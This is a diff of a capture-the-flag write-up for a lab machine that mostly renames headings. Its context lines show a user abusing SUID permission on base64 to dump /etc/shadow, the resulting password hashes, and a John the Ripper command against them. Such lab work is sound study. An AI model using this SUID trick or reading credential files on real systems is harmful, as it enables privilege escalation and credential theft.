@@ -211,10 +211,9 @@ nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
 missy:x:1001:1001::/home/missy:/bin/bash
 ```
 
-## Password Cracking
-### `suid` `base64` and `shadow` file password cracking
+## `shadow` File Password Cracking 
 
-### Taking Advantage of SUID Permission on `base64` to Check `/etc/shadow` File
+By taking advantage of SUID permission on `base64` we can check contents of `/etc/shadow`.
 `[leonard@ip-10-10-17-216 ~]$ base64 "/etc/shadow" | base64 --decode`
 ```
 root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
@@ -289,7 +288,7 @@ missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfw
 missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:1001:1001::/home/missy:/bin/bash
 ```
 
-### Password Cracking with John the Ripper
+### Cracking the Hash with John the Ripper
 
 `sudo john --wordlist=/opt/wordlist/passwords/rockyou.txt unshadow`
 ```
